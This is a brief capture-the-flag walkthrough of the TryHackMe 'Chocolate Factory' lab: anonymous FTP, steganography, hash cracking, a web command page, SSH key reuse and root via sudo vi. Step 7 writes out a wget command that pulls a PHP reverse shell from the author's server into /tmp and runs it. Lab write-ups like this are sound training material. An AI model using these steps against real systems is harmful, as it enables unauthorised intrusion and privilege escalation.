# Chocolate Factory

https://tryhackme.com/room/chocolatefactory

"A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!"

Pretty trivial room, no roadblocks.

1. nmap revealed a host of ports, but the only ones that seemed relevant were 21, 22 and 80.
2. on 21 was an ftp server allowing anonymous access. inside was an image, upon which I ran `steghide extract -sF <file>` to get a text file containing base64
3. decoding this base64 revealed what looked like a shadow or password file, with the hash for a user named charlie
4. cracking this with hashcat (`-m 1800`) got the password `cn7824`, however this didn't work for ssh
5. back to port 80, the website had a log on. the creds from above did work here, getting to a command interface that seemed unrestricted
6. via the command interface I found a file called `key_rev_key`, which was an elf binary. i decompiled it to get a 'key' to save for later.
7. i couldn't establish a typical reverse shell via the rce page, via nc or socat, nor could i download the php-reverse-shell.php to the web directory as it was owned by root and I didn't have write permissions as www-data. however i could download to /tmp (via `wget webserver/php-reverse-shell.php -O/tmp/php-reverse-shell.php`) and then run the php via `cat /tmp/php-reverse-shell.php | php -e`
8. in charlie's home folder were teleport and teleport.pub - these turned out to be ssh keys, so I copied the private key locally, `chmod 700` and then was able to ssh in as charlie (this gave me the user flag)
9. charlie had the ability to run vi as sudo (bit odd: it had `(ALL : !root) NOPASSWD: /usr/bin/vi` but it ran as root anyway), so doing this I used `:! /bin/sh -p` to get a root shell.
10. in the root folder was a `root.py` script, that appeared to take the key i saved earlier and use it to reveal the root flag. entering it in wasn't working due to some bad character issue, so i just altered the python file to embed the key instead of asking for it.

All done and dusted.
